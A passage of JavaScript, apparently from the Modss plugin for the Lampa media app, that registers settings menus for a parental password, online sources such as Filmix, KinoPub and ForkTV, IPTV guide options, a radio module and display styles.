				icon: "<svg viewBox='0 0 24 24' xml:space='preserve' xmlns='https://www.w3.org/2000/svg'><path d='M19.7.5H4.3C2.2.5.5 2.2.5 4.3v15.4c0 2.1 1.7 3.8 3.8 3.8h15.4c2.1 0 3.8-1.7 3.8-3.8V4.3c0-2.1-1.7-3.8-3.8-3.8zm-2.1 16.4c.3 0 .5.2.5.5s-.2.5-.5.5h-3c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h1V8.4l-3.2 5.4-.1.1-.1.1h-.6s-.1 0-.1-.1l-.1-.1-3-5.4v8.5h1c.3 0 .5.2.5.5s-.2.5-.5.5h-3c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h1V7.1h-1c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h1.7c.1 0 .2.1.2.2l3.7 6.2 3.7-6.2.2-.2h1.7c.3 0 .5.2.5.5s-.2.5-.5.5h-1v9.8h1z' fill='#ffffff' class='fill-000000'></path></svg>"
			});
			
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_status',
					type: 'title'
				},
				field: {
					name: '<div class="settings-folder" style="padding:0!important"><div style="width:3em;height:2.3em;margin-top:-.5em;padding-right:.5em"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z"></path><path d="M3 3h18a1 1 0 0 1 1 1v16a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm8 5.5v7h2v-7h-2zm-.285 0H8.601l-1.497 4.113L5.607 8.5H3.493l2.611 6.964h2L10.715 8.5zm5.285 5h1.5a2.5 2.5 0 1 0 0-5H14v7h2v-2zm0-2v-1h1.5a.5.5 0 1 1 0 1H16z" fill="#ffffff" class="fill-000000"></path></svg></div><div style="font-size:1.3em">Осталось: <span id="modss_left" style="background-color: #ffe216;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;padding: 0 0.3em;color: #000;">14</span> <span id="modss_left_text">дней</span></div></div>',
					description: '<div class="ad-server" style="margin: 0em 0em;"><div class="ad-server__text">🆔 <b>142486046</b><br>❇️ 💻 Mac · macOS 10.15.7</b></div><img src="https://lampa.stream/group.png" class="ad-server__qr"><div class="ad-server__label">@modssmy_bot</div></div>'
				},
				onRender: function (item) {
					setTimeout(function () {
						var parts = leftVipD.match(/(💎)?(\d+)(.*)/);
						if (!parts) return;
						var numberPart = parts[2];
						var textPart = parts[3].trim();
						$('#modss_left').html(numberPart);
						$('#modss_left_text').html(textPart);
					}, 100);
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_password',
					type: 'static', //доступно select,input,trigger,title,static
					placeholder: Lampa.Lang.translate('placeholder_password'),
					values: '',
					default: ''
				},
				field: {
					name: Lampa.Lang.translate('title_parent_contr'),
					description: Lampa.Lang.translate('placeholder_password')
				},
				onRender: function (item) {
					function pass() {
						Lampa.Input.edit({
							value: '' + Lampa.Storage.get('mods_password') + '',
							free: true,
							nosave: true
						}, function (t) {
							Lampa.Storage.set('mods_password', t);
							Lampa.Settings.update();
						});
					}
					item.on('hover:enter', function () {
						if (Lampa.Storage.get('mods_password')) Lampa.Input.edit({
							value: '',
							title: 'Введите старый пароль',
							free: true,
							nosave: true
						}, function (t) {
							if (t == Lampa.Storage.get('mods_password')) pass();
							else Lampa.Noty.show('Неверный пароль');
						});
						else pass();
					});
					if (Lampa.Storage.get('mods_password')) item.find('.settings-param__descr').text('Изменить пароль');
					else item.find('.settings-param__descr').text(Lampa.Lang.translate('placeholder_password'));
				},
				onChange: function (value) {
					if (value) $('body').find('.settings-param__descr').text('Изменить пароль');
					else $('body').find('.settings-param__descr').text(Lampa.Lang.translate('placeholder_password'));
				}
			});
			        //Add-ons
        Lampa.SettingsApi.addParam({
            component: 'settings_modss',
            param: {
                name: 'mods_onl',
                type: 'trigger', //доступно select,input,trigger,title,static
                default: true
            },
            field: {
                name: Lampa.Lang.translate('params_pub_on') + ' online ' + Lampa.Lang.translate('modss_title_online').toLowerCase(),
                description: Lampa.Lang.translate('onl_enable_descr')
            },
            onChange: function (value) {
                if (cards) Modss.online(value == "true" ? false : 'delete');
                Lampa.Settings.update();
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'settings_modss',
            param: {
                name: 'modss_online_param',
                type: 'static', //доступно select,input,trigger,title,static
                default: true
            },
            field: {
                name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg viewBox="0 0 32 32" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 32 32"><path d="m17 14.5 4.2-4.5L4.9 1.2c-.1-.1-.3-.1-.6-.2L17 14.5zM23 21l5.9-3.2c.7-.4 1.1-1 1.1-1.8s-.4-1.5-1.1-1.8L23 11l-4.7 5 4.7 5zM2.4 1.9c-.3.3-.4.7-.4 1.1v26c0 .4.1.8.4 1.2L15.6 16 2.4 1.9zM17 17.5 4.3 31c.2 0 .4-.1.6-.2L21.2 22 17 17.5z" fill="currentColor" fill="#ffffff" class="fill-000000"></path></svg></div><div style="font-size:1.3em">Online</div></div>'
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) {
                    item.show();
                } else item.hide();

                item.on('hover:enter', function () {
                    Lampa.Settings.create('modss_online_param');
                    Lampa.Controller.enabled().controller.back = function () {
                        Lampa.Settings.create('settings_modss');
                        setTimeout(function () {
                            Navigator.focus($('body').find('[data-static="true"]:eq(1)')[0]);
                        }, 100);
                    }
                });
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'modss_online_param',
            param: {
                name: 'priority_balanser',
                type: 'select', //доступно select,input,trigger,title,static
                values: Modss.balansers(),
                default: Modss.balansPrf
            },
            field: {
                name: Lampa.Lang.translate('title_prioriry_balanser'),
                description: Lampa.Lang.translate('title_prioriry_balanser_descr')
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) item.show();
                else item.hide();
            },
            onChange: function (values) {
                var title = $('body').find('[data-name="priority_balanser"] .settings-param__value');
                title.text(title.text().split('<').shift());
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'modss_online_param',
            param: {
                name: 'online_but_first',
                type: 'trigger', //доступно select,input,trigger,title,static
                default: true
            },
            field: {
                name: Lampa.Lang.translate('title_online_first_but'),
            },
            onChange: function (item) {
                Lampa.Storage.set('full_btn_priority', '');
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) item.show();
                else item.hide();
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'modss_online_param',
            param: {
                name: 'online_continued',
                type: 'trigger', //доступно select,input,trigger,title,static
                default: false
            },
            field: {
                name: Lampa.Lang.translate('title_online_continued'),
                description: Lampa.Lang.translate('title_online_descr')
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) item.show();
                else item.hide();
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'modss_online_param',
            param: {
                name: 'online_dash',
                type: 'trigger', //доступно select,input,trigger,title,static
                default: false
            },
            field: {
                name: Lampa.Lang.translate('online_dash'),
                description: Lampa.Lang.translate('modss_balanser') + ' Collaps'
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) item.show();
                else item.hide();
            }
        });
			        //Filmix
        Lampa.SettingsApi.addParam({
            component: 'modss_online_param',
            param: {
                name: 'filmix_param',
                type: 'static', //доступно select,input,trigger,title,static
                default: true
            },
            field: {
                name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg height="26" width="26" viewBox="0 0 58 57" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M20 20.3735V45H26.8281V34.1262H36.724V26.9806H26.8281V24.3916C26.8281 21.5955 28.9062 19.835 31.1823 19.835H39V13H26.8281C23.6615 13 20 15.4854 20 20.3735Z" fill="white"/><rect x="2" y="2" width="54" height="53" rx="5" stroke="white" stroke-width="4"/></svg></div><div style="font-size:1.3em">Filmix</div></div>',
                description: ' '
            },
            onRender: function (item) {
                if (Lampa.Storage.field('mods_onl')) {
                    item.show();
                    $('.settings-param__name', item).before('<div class="settings-param__status"></div>');
                    Filmix.checkPro(Filmix.token);
                    Filmix.showStatus(item);
                } else item.hide();
                item.on('hover:enter', function () {
                    Lampa.Settings.create('filmix_param');
                    Lampa.Controller.enabled().controller.back = function () {
                        Lampa.Settings.create('modss_online_param');
                        setTimeout(function () {
                            Navigator.focus($('body').find('[data-static="true"]:eq(0)')[0]);
                        }, 100);
                    }
                });
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'filmix_param',
            param: {
                name: 'filmix_status',
                type: 'title', //доступно select,input,trigger,title,static
                default: ''
            },
            field: {
                name: '<b style="color:#fff">' + Lampa.Lang.translate('title_status') + '</b>',
                description: ' '
            },
            onRender: function (item) {
                $('.settings-param__descr', item).before('<div class="settings-param__status"></div>');
                Filmix.showStatus(item);
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'filmix_param',
            param: {
                name: 'filmix_add',
                type: 'static', //доступно select,input,trigger,title,static
                default: ''
            },
            field: {
                name: Lampa.Lang.translate('filmix_params_add_device') + ' Filmix',
                description: Lampa.Lang.translate('pub_auth_add_descr')
            },
            onRender: function (item) {
                item.on('hover:enter', function () {
                    Filmix.add_new();
                });
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'filmix_param',
            param: {
                name: 'filmix_token',
                type: 'input', //доступно select,input,trigger,title,static
                values: '',
                placeholder: Lampa.Lang.translate('filmix_param_placeholder'),
                default: ''
            },
            field: {
                name: Lampa.Lang.translate('filmix_param_add_title'),
                description: Lampa.Lang.translate('filmix_param_add_descr')
            },
            onChange: function (value) {
                if (value) {
                    Filmix.checkPro(value, true);
                    Filmix.token = value;
                } else {
                    Lampa.Storage.set("filmix_status", {});
                    Filmix.token = Lampa.Storage.get('filmix_token', 'aaaabbbbccccddddeeeeffffaaaabbbb');
                    Filmix.showStatus();
                }
            }
        });
        Lampa.SettingsApi.addParam({
            component: 'filmix_param',
            param: {
                name: 'filmix_token_clear',
                type: 'static', //доступно select,input,trigger,title,static
                default: ''
            },
            field: {
                name: 'Очистить токен',
                description: 'Уберет привязку в Lampa'
            },
            onRender: function (item) {
                if (Lampa.Storage.field('filmix_status')) item.show(); else item.hide();

                item.on('hover:enter', function () {
                    Lampa.Noty.show('Токен очищен');
                    Lampa.Storage.set("filmix_token", '');
                    Lampa.Storage.set("filmix_status", {});
                    Filmix.token = Lampa.Storage.get('filmix_token', 'aaaabbbbccccddddeeeeffffaaaabbbb');
                    $('[data-name="filmix_token"] .settings-param__value').text('');
                    Filmix.showStatus();
                });
            }
        });
				//Pub
	Lampa.SettingsApi.addParam({
		component: 'modss_online_param',
		param: {
			name: 'pub_param',
			type: 'static', //доступно select,input,trigger,title,static
			default: true
		},
		field: {
			name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg height="26" width="26" viewBox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg"><path d="M19.7.5H4.3C2.2.5.5 2.2.5 4.3v15.4c0 2.1 1.7 3.8 3.8 3.8h15.4c2.1 0 3.8-1.7 3.8-3.8V4.3c0-2.1-1.7-3.8-3.8-3.8zM13 14.6H8.6c-.3 0-.5.2-.5.5v4.2H6V4.7h7c2.7 0 5 2.2 5 5 0 2.7-2.2 4.9-5 4.9z" fill="#ffffff" class="fill-000000 fill-ffffff"></path><path d="M13 6.8H8.6c-.3 0-.5.2-.5.5V12c0 .3.2.5.5.5H13c1.6 0 2.8-1.3 2.8-2.8.1-1.6-1.2-2.9-2.8-2.9z" fill="#ffffff" class="fill-000000 fill-ffffff"></path></svg></div><div style="font-size:1.3em">KinoPub</div></div>',
			description: Lampa.Lang.translate('filmix_nodevice')
		},
		onRender: function (item) {
			if (Lampa.Storage.field('mods_onl')) {
				item.show();
				$('.settings-param__name', item).before('<div class="settings-param__status"></div>');
				Pub.userInfo(item, true);
			} else item.hide();
			item.on('hover:enter', function () {
				Lampa.Settings.create('pub_param');
				Lampa.Controller.enabled().controller.back = function () {
					Lampa.Settings.create('modss_online_param');
					setTimeout(function () {
						Navigator.focus($('body').find('[data-static="true"]:eq(1)')[0]);
					}, 100);
				};
			});
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_auth',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: ' ',
			description: ' ',
		},
		onRender: function (item) {
			$('.settings-param__name', item).before('<div class="settings-param__status"></div>');
			Pub.userInfo(item);
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_auth_add',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: Lampa.Lang.translate('filmix_params_add_device') + ' KinoPub',
			description: Lampa.Lang.translate('pub_auth_add_descr')
		},
		onRender: function (item) {
			item.on('hover:enter', function () {
				Pub.Auth_pub();
			});
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_speed',
			type: 'static', //доступно select,input,trigger,title,static
		},
		field: {
			name: 'SpeedTest',
			description: 'Выбор лучшего сервера KinoPub'
		},
		onRender: function (item) {
			item.on('hover:enter', function () {
				Lampa.Iframe.show({
					url: Protocol() + 'zamerka.com/',
					onBack: function onBack() {
						Lampa.Controller.toggle('settings_component');
					}
				});
			});
			if (!Lampa.Storage.field('mods_onl')) item.hide();
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_parametrs',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: Lampa.Lang.translate('title_settings'),
			description: Lampa.Lang.translate('descr_pub_settings')
		},
		onRender: function (item) {
			if (!Lampa.Storage.get('logined_pub')) item.hide();
			item.on('hover:enter', function () {
				Pub.info_device();
			});
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_source',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: Lampa.Lang.translate('params_pub_add_source'),
			description: Lampa.Lang.translate('params_pub_add_source_descr')
		},
		onRender: function (item) {
			item.on('hover:enter', function () {
				Lampa.Noty.show(Lampa.Lang.translate('pub_source_add_noty'));
				Lampa.Storage.set('source', 'pub');
			});
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_del_device',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: Lampa.Lang.translate('params_pub_dell_device'),
			description: Lampa.Lang.translate('params_pub_dell_descr')
		},
		onRender: function (item) {
			if (Pub.token.indexOf('wt7ytq') == 0) item.hide();
			item.on('hover:enter', function () {
				Pub.delete_device(function () {
					Lampa.Settings.create('pub_param');
				});
			});
		}
	});
	Lampa.SettingsApi.addParam({
		component: 'pub_param',
		param: {
			name: 'pub_clear_tocken',
			type: 'static' //доступно select,input,trigger,title,static
		},
		field: {
			name: Lampa.Lang.translate('params_pub_clean_tocken')
		},
		onRender: function (item) {
			item.on('hover:enter', function () {
				Lampa.Storage.set('pub_access_token', Pub.token);
				Lampa.Storage.set('logined_pub', 'false');
				Lampa.Noty.show('Cleared');
				Lampa.Settings.update();
			});
		}
	});

      		Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_title',
					type: 'title', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: Lampa.Lang.translate('title_addons')
				}
			});

      		Lampa.SettingsApi.addParam({
  component: 'settings_modss',
  param: {
    name: 'mods_tv',
    type: 'trigger', //доступно select,input,trigger,title,static
    default: false
  },
  field: {
    name: Lampa.Lang.translate('params_tv_enable'),
    description: Lampa.Lang.translate('params_tv_enable_descr')
  },
  onChange: function (value) {
    Modss.tv_modss();
    Lampa.Settings.update();
  }
});
Lampa.SettingsApi.addParam({
  component: 'settings_modss',
  param: {
    name: 'modss_tv_param',
    type: 'static', //доступно select,input,trigger,title,static
    default: true
  },
  field: {
    name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" class="bi bi-tv"><path fill="currentColor" d="M2.5 13.5A.5.5 0 0 1 3 13h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zM13.991 3l.024.001a1.46 1.46 0 0 1 .538.143.757.757 0 0 1 .302.254c.067.1.145.277.145.602v5.991l-.001.024a1.464 1.464 0 0 1-.143.538.758.758 0 0 1-.254.302c-.1.067-.277.145-.602.145H2.009l-.024-.001a1.464 1.464 0 0 1-.538-.143.758.758 0 0 1-.302-.254C1.078 10.502 1 10.325 1 10V4.009l.001-.024a1.46 1.46 0 0 1 .143-.538.758.758 0 0 1 .254-.302C1.498 3.078 1.675 3 2 3h11.991zM14 2H2C0 2 0 4 0 4v6c0 2 2 2 2 2h12c2 0 2-2 2-2V4c0-2-2-2-2-2z"/></svg></div><div style="font-size:1.3em">Modss-TV</div></div>',
  },
  onRender: function (item) {
    if (!Lampa.Storage.field('mods_tv')) item.hide();
    item.on('hover:enter', function () {
      Lampa.Settings.create('modss_tv_param');
      Lampa.Controller.enabled().controller.back = function(){
          Lampa.Settings.create('settings_modss');
          setTimeout(function() {
            Navigator.focus($('body').find('[data-static="true"]:eq(2)')[0]);
          }, 100);
        };
    });
  }
});



  Lampa.Params.trigger('iptv_modss_guide_update_after_start', false);
  Lampa.Params.trigger('iptv_modss_guide_custom', false);
  Lampa.Params.select('iptv_modss_guide_url', '', '');
  Lampa.Params.select('iptv_modss_guide_interval', {
    '0': '#{iptv_param_guide_update_custom}',
    '1': '1',
    '2': '2',
    '3': '3',
    '5': '5',
    '8': '8',
    '12': '12',
    '18': '18',
    '24': '24 / 1',
    '48': '48 / 2',
    '72': '72 / 3',
    '96': '96 / 4',
    '120': '120 / 5',
    '144': '144 / 6',
    '168': '168 / 7'
  }, '24');
  Lampa.Params.select('iptv_modss_guide_save', {
    '1': '1',
    '2': '2',
    '3': '3',
    '4': '4',
    '5': '5',
    '6': '6',
    '7': '7',
    '14': '14'
  }, '3');


  if (Lampa.Manifest.app_digital >= 200) {
    Lampa.SettingsApi.addParam({
      component: 'modss_tv_param',
      param: {
        type: 'button'
      },
      field: {
        name: Lampa.Lang.translate('iptv_param_guide')
      },
      onChange: function onChange() {
        Lampa.Settings.create('iptv_modss_guide', {
          onBack: function onBack() {
            Lampa.Settings.create('modss_tv_param');
          }
        });
      }
    });
  }
  Lampa.SettingsApi.addParam({
    component: 'modss_tv_param',
    param: {
      type: 'title'
    },
    field: {
      name: Lampa.Lang.translate('more')
    }
  });
  Lampa.SettingsApi.addParam({
    component: 'modss_tv_param',
    param: {
      name: 'iptv_modss_view_in_main',
      type: 'trigger',
      "default": true
    },
    field: {
      name: Lampa.Lang.translate('iptv_param_view_in_main')
    }
  });
  Lampa.SettingsApi.addParam({
    component: 'modss_tv_param',
    param: {
      name: 'iptv_use_db',
      type: 'select',
      values: {
        indexdb: 'IndexedDB',
        storage: 'LocalStorage'
      },
      "default": 'indexdb'
    },
    field: {
      name: Lampa.Lang.translate('iptv_param_use_db')
    },
    onChange: function onChange() {
      Favorites.load().then(function () {
        document.querySelectorAll('.iptv-playlist-item').forEach(function (element) {
          Lampa.Utils.trigger(element, 'update');
        });
      });
    }
  });
  Lampa.SettingsApi.addParam({
    component: 'modss_tv_param',
    param: {
      name: 'iptv_favotite_save',
      type: 'select',
      values: {
        url: '#{iptv_param_save_favorite_url}',
        name: '#{iptv_param_save_favorite_name}'
      },
      "default": 'url'
    },
    field: {
      name: Lampa.Lang.translate('iptv_param_save_favorite')
    }
  });
  Lampa.SettingsApi.addParam({
    component: 'modss_tv_param',
    param: {
      name: 'iptv_favotite_sort',
      type: 'select',
      values: {
        add: '#{iptv_param_sort_add}',
        name: '#{iptv_param_sort_name}',
        view: '#{iptv_param_sort_view}'
      },
      "default": 'add'
    },
    field: {
      name: Lampa.Lang.translate('iptv_param_sort_favorite')
    },
    onRender: function onRender(item) {},
    onChange: function onChange() {}
  });

      		            //ForkTV
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_fork',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: false
				},
				field: {
					name: Lampa.Lang.translate('params_pub_on') + ' ForkTV',
					description: Lampa.Lang.translate('fork_enable_descr')
				},
				onChange: function (value) {
					if (value) ForkTV.check_forktv('', true);
					Lampa.Settings.update();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'fork_param',
					type: 'static', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="mdi-alpha-f-box-outline" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M9,7H15V9H11V11H14V13H11V17H9V7M3,5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5M5,5V19H19V5H5Z" /></svg></div><div style="font-size:1.3em">ForkTV</div></div>',
					description: Lampa.Lang.translate('filmix_nodevice')
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_fork')) {
						item.show();
						$('.settings-param__name', item).before('<div class="settings-param__status"></div>');
						ForkTV.check_forktv(item, true);
					} else item.hide();
					item.on('hover:enter', function () {
						Lampa.Settings.create('fork_param');
						Lampa.Controller.enabled().controller.back = function(){
							Lampa.Settings.create('settings_modss');
							setTimeout(function() {
								Navigator.focus($('body').find('[data-static="true"]:eq(3)')[0]);
							}, 100);
						}
					});
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'fork_param',
				param: {
					name: 'forktv_url',
					type: 'static' //доступно select,input,trigger,title,static
				},
				field: {
					name: ForkTV.url,
					description: Lampa.Lang.translate('filmix_nodevice')
				},
				onRender: function (item) {
					$('.settings-param__name', item).before('<div class="settings-param__status"></div>');
					ForkTV.check_forktv(item, false);
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'fork_param',
				param: {
					name: 'ForkTV_add',
					type: 'static', //доступно select,input,trigger,title,static
					default: ''
				},
				field: {
					name: Lampa.Storage.get('ForkTv_cat') ? Lampa.Lang.translate('title_fork_edit_cats') : Lampa.Lang.translate('title_fork_add_cats'),
					description: ''
				},
				onRender: function (item) {
					if (Lampa.Storage.get('forktv_auth')) {
						item.show();
					} else item.hide();
					item.on('hover:enter', function () {
						ForkTV.check_forktv(item);
					});
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'fork_param',
				param: {
					name: 'ForkTV_clear',
					type: 'static', //доступно select,input,trigger,title,static
					default: ''
				},
				field: {
					name: Lampa.Lang.translate('title_fork_clear'),
					description: Lampa.Lang.translate('title_fork_clear_descr')
				},
				onRender: function (item) {
					if (Lampa.Storage.get('forktv_auth')) {
						item.show();
					} else item.hide();
					item.on('hover:enter', function () {
						Lampa.Storage.set('ForkTv_cat', '');
						Lampa.Noty.show(Lampa.Lang.translate('title_fork_clear_noty'));
					});
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'fork_param',
				param: {
					name: 'ForkTV_clearMac',
					type: 'static', //доступно select,input,trigger,title,static
					default: ''
				},
				field: {
					name: Lampa.Lang.translate('title_fork_reload_code'),
					description: ' '
				},
				onRender: function (item) {
					item.on('hover:enter', function () {
						ForkTV.updMac(item);
					});
				}
			});
      		            //Radio
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_radio',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: false
				},
				field: {
					name: Lampa.Lang.translate('params_radio_enable'),
					description: Lampa.Lang.translate('params_radio_enable_descr')
				},
				onChange: function (value) {
					Modss.radio();
					Lampa.Settings.update();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'modss_radio_param',
					type: 'static', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: '<div class="settings-folder" style="padding:0!important"><div style="width:1.8em;height:1.3em;padding-right:.5em"><svg width="38" height="31" viewBox="0 0 38 31" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="17.613" width="3" height="16.3327" rx="1.5" transform="rotate(63.4707 17.613 0)" fill="currentColor"></rect><circle cx="13" cy="19" r="6" fill="currentColor"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M0 11C0 8.79086 1.79083 7 4 7H34C36.2091 7 38 8.79086 38 11V27C38 29.2091 36.2092 31 34 31H4C1.79083 31 0 29.2091 0 27V11ZM21 19C21 23.4183 17.4183 27 13 27C8.58173 27 5 23.4183 5 19C5 14.5817 8.58173 11 13 11C17.4183 11 21 14.5817 21 19ZM30.5 18C31.8807 18 33 16.8807 33 15.5C33 14.1193 31.8807 13 30.5 13C29.1193 13 28 14.1193 28 15.5C28 16.8807 29.1193 18 30.5 18Z" fill="currentColor"></path></svg></div><div style="font-size:1.3em">Modss Radio</div></div>'
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_radio')) {
						item.show();
					} else item.hide();
					item.on('hover:enter', function () {
						Lampa.Settings.create('modss_radio_param');
						Lampa.Controller.enabled().controller.back = function(){
							Lampa.Settings.create('settings_modss');
							setTimeout(function() {
								Navigator.focus($('body').find('[data-static="true"]:eq(4)')[0]);
							}, 100);
						}
					});
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'modss_radio_param',
				param: {
					name: 'modssdm_use_aac',
					type: 'trigger',
					default: false
				},
				field: {
					name: Lampa.Lang.translate('modssfm_use_aac_title'),
					description: Lampa.Lang.translate('modssfm_use_aac_desc')
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_radio')) item.show();
					else item.hide();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'modss_radio_param',
				param: {
					name: 'modssfm_show_info',
					type: 'trigger',
					default: true
				},
				field: {
					name: Lampa.Lang.translate('modssfm_show_info_title'),
					description: Lampa.Lang.translate('modssfm_show_info_desc')
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_radio')) item.show();
					else item.hide();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'modss_radio_param',
				param: {
					name: 'modssfm_fetch_covers',
					type: 'trigger',
					default: true
				},
				field: {
					name: Lampa.Lang.translate('modssfm_fetch_covers_title'),
					description: Lampa.Lang.translate('modssfm_fetch_covers_desc')
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_radio')) item.show();
					else item.hide();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'modss_radio_param',
				param: {
					name: 'modssfm_show_analyzer',
					type: 'select',
					values: {
						hide: 'Не показывать',
						line: 'Линейний',
						ball: 'Шар'
					},
					default: 'ball'
				},
				field: {
					name: Lampa.Lang.translate('modssfm_show_analyzer_title'),
					description: Lampa.Lang.translate('modssfm_show_analyzer_desc')
				},
				onRender: function (item) {
					if (Lampa.Storage.field('mods_radio')) item.show();
					else item.hide();
				}
			});
			
			//Collection
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_collection',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: false
				},
				field: {
					name: Lampa.Lang.translate('params_pub_on') + ' ' + Lampa.Lang.translate('menu_collections').toLowerCase(),
					description: Lampa.Lang.translate('params_collections_descr')
				},
				onChange: function (value) {
					if (value == 'true') Modss.collections();
					else $('body').find('.menu [data-action="collection"]').remove();
				}
			});
			//Styles
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_title',
					type: 'title', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: Lampa.Lang.translate('params_styles_title')
				}
			});

			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_snow',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: false
				},
				field: {
					name: 'Снег'
				},
				onChange: function (value) {
					Modss.snow();
				}
			});
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_rating',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: Lampa.Lang.translate('title_enable_rating'),
					description: Lampa.Lang.translate('title_enable_rating_descr')
				},
				onChange: function (value) {
					if (value == 'true') {
  				  		$('body').find('.rate--kp, .rate--imdb').removeClass('hide');
						Modss.rating_kp_imdb(cards);
					} else $('body').find('.rate--kp, .rate--imdb').addClass('hide');
  				}
			});
			Lampa.SettingsApi.addParam({
				component: 'settings_modss',
				param: {
					name: 'mods_serial_info',
					type: 'trigger', //доступно select,input,trigger,title,static
					default: true
				},
				field: {
					name: Lampa.Lang.translate('title_info_serial'),
					description: Lampa.Lang.translate('title_info_serial_descr')
				},
				onChange: function (value) {
					if (value == 'true' && $('body').find('.full-start__poster').length) Modss.serialInfo(cards);
					else $('body').find('.files__left .time-line, .card--last_view, .card--new_seria').remove();
				}
			});
			/*if (/iPhone|iPad|iPod|android|x11/i.test(navigator.userAgent) || (Lampa.Platform.is('android') && window.innerHeight < 1080)) {
				Lampa.SettingsApi.addParam({
					component: 'settings_modss',
					param: {
						name: 'mods_butt_back',
						type: 'trigger', //доступно select,input,trigger,title,static
						default: false
					},
					field: {
						name: Lampa.Lang.translate('title_add_butback'),
						description: Lampa.Lang.translate('title_add_butback_descr')
					},
					onChange: function (value) {
						Lampa.Settings.update();
						if (value == 'true') Modss.buttBack();
						else $('body').find('.elem-mobile-back').remove();
					}
				});
				Lampa.SettingsApi.addParam({
					component: 'settings_modss',
					param: {
						name: 'mods_butt_pos',
						type: 'select', //доступно select,input,trigger,title,static
						values: {
							right: Lampa.Lang.translate('buttback_right'),
